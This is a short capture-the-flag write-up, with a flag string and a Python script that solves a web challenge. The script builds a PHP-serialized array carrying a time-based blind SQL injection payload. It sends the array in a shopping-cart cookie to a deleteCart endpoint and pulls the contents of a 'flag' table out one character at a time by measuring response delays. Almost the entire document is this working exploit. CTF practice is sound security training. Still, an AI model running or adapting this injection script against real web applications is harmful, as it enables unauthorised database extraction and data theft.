

## flag
MOCSCTF{CTF@is@very@good}
不支持动态部署

## writeup
```python
import requests
import subprocess 
import requests
import time


url = "http://localhost:80"
result = ""
i = 0

print("[+]盲注中...")
while True:
    i = i + 1
    head = 32
    tail = 127

    while head < tail:
        mid = (head + tail) >> 1
        #payload = "select database()" # 查询数据库
        payload = "select group_concat(concat_ws(0x7e,flag)) from flag limit 0,1" # 查询账号和密码
        code = f'''
                $info = array(
                    0=>array(
                        "ProductID"=>"1)or(if(ascii(substr(({payload}),{i},1))>{mid},sleep(0.005),1))#"
                    )
                );
                echo urlencode(serialize($info));
        '''
        codes = subprocess.run(['php','-r',code], stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.decode()

        full_url = url+"/index.php/public/deleteCart?id=a"
        headers = {
            "cookie":"youdiany_shopping_cart="+codes.replace("+","%20")
        }

        t1=time.time() 
        r = requests.get(url=full_url,headers=headers)
        t2=time.time()
        if t2-t1>1:
            head = mid + 1
        else:
            tail = mid

    if head != 32:
        result += chr(head)
    else:
        break
    print(result)
```